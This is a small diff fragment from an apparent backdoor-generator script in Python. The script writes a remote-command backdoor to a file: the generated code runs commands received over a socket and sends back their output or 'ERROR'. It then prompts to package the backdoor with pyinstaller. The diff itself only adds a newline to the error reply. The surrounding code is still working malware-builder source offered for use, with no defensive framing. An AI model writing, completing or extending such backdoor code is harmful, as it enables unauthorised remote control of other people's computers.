@@ -62,7 +62,7 @@ backdoor.write('        elif cmd != "" and not hasarg[cmd]:\n')
 backdoor.write('                output = commands[cmd]()\n')
 backdoor.write('                sock.sock.s.send(output)\n')
 backdoor.write('        else:\n')
-backdoor.write('                sock.sock.s.send("ERROR")\n')
+backdoor.write('                sock.sock.s.send("ERROR\n")\n')
 backdoor.write('    sock.sock.s.close()\n')
 backdoor.close()
 if raw_input('If you have pyinstaller installed enter Y if not anything else: ') == 'Y':
